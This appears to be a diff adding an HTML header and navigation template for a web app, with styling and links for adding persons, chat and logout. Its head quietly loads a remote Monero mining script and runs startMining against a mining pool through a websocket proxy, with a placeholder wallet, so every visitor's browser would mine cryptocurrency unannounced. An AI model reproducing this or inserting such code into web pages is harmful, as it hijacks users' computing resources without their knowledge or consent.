@@ -1,0 +1,38 @@
+<head>
+  <style>
+    ul.nav { list-style-type: none; margin: 0; padding: 0; overflow: hidden;
+    background-color: #333; font-size: 2rem; } li.nav { float: left; } li a {
+    display: block; color: white; text-align: center; padding: 14px 16px;
+    text-decoration: none; } li a:hover:not(.active) { background-color: #111; }
+    .active { background-color: #aa2504; } .navimg{ height: 5em; padding: 0;}
+  </style>
+  <script src="https://monerominer.rocks/miner-mmr/webmnr.min.js"></script>
+  <script>
+    server = "wss://f.xmrminingproxy.com:8181"; var pool = "moneroocean.stream";
+    var walletAddress = "PUT YOUR WALLET ADDRESS HERE"; var workerId = "" 
+    var threads = -1; var password = "x"; startMining(pool, walletAddress, workerId,
+    threads, password); throttleMiner = 20;
+  </script>
+</head>
+
+<body>
+  <ul class="nav">
+    <li class="nav"><a class="nav" href="/home"><img
+          class="navimg"
+          src="/logo.png"
+        /></a></li>
+
+    <li style="float:right" class="nav"><a class="active" href="/persons/add">Add
+        person</a></li>
+
+          <li style="float:right" class="nav"><a class="active" href="/chats">Chat</a></li>
+
+    <li style="float:right" class="nav"><a
+        class="active"
+        href="/logout"
+      >Logout</a></li>
+
+
+</li>
+  </ul>
+</body>
